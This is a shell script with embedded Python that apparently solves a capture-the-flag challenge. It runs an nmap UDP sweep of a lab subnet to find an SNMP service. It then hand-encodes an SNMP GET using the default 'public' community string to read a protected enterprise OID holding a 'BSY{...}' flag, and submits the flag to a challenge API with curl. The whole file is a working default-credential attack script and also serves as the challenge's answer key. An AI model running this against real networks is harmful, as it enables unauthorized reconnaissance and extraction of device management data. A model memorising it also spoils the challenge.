#!/bin/sh
set -eu

host="$(nmap -n -sU -p 161 -T4 --open -oG - 172.20.0.141-199 | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"Host: ([0-9.]+).*Ports: 161/open/udp", s); print(m.group(1) if m else "")')"
if [ -z "$host" ]; then
  echo "No responding management service found" >&2
  exit 1
fi

flag="$(python3 - "$host" <<'PY'
import socket
import sys

host = sys.argv[1]

def tlv(tag, value):
    n = len(value)
    if n < 128:
        length = bytes([n])
    else:
        raw = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        length = bytes([0x80 | len(raw)]) + raw
    return bytes([tag]) + length + value

def integer(value):
    raw = value.to_bytes(max(1, (value.bit_length() + 7) // 8), 'big')
    if raw[0] & 0x80:
        raw = b'\x00' + raw
    return tlv(0x02, raw)

def oid(values):
    parts = [40 * values[0] + values[1], *values[2:]]
    encoded = bytearray()
    for value in parts:
        groups = [value & 0x7f]
        value >>= 7
        while value:
            groups.append(0x80 | (value & 0x7f))
            value >>= 7
        encoded.extend(reversed(groups))
    return tlv(0x06, bytes(encoded))

def read_tlv(data, offset=0):
    if offset + 2 > len(data):
        raise ValueError('short TLV')
    tag = data[offset]
    first = data[offset + 1]
    offset += 2
    if first & 0x80:
        count = first & 0x7f
        size = int.from_bytes(data[offset:offset + count], 'big')
        offset += count
    else:
        size = first
    end = offset + size
    if end > len(data):
        raise ValueError('short value')
    return tag, data[offset:end], end

def fields(data):
    result, offset = [], 0
    while offset < len(data):
        tag, value, offset = read_tlv(data, offset)
        result.append((tag, value))
    return result

# Read the protected scalar using the default read community credential.
target = (1, 3, 6, 1, 4, 1, 55555, 1, 0)
binding = tlv(0x30, oid(target) + tlv(0x05, b''))
pdu = tlv(0xA0, integer(42) + integer(0) + integer(0) + tlv(0x30, binding))
request = tlv(0x30, integer(1) + tlv(0x04, b'public') + pdu)
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
    client.settimeout(4)
    client.sendto(request, (host, 161))
    packet, _ = client.recvfrom(8192)
outer = fields(read_tlv(packet)[1])
if len(outer) != 3 or outer[2][0] != 0xA2:
    raise SystemExit('Unexpected management response')
pdu_fields = fields(outer[2][1])
varbinds = fields(pdu_fields[3][1])
record = fields(varbinds[0][1])
if len(record) != 2 or record[1][0] != 0x04:
    raise SystemExit('The protected record was not returned')
value = record[1][1].decode().strip()
if not value.startswith('BSY{') or not value.endswith('}'):
    raise SystemExit('Unexpected record format')
print(value)
PY
)"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-68cc49\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
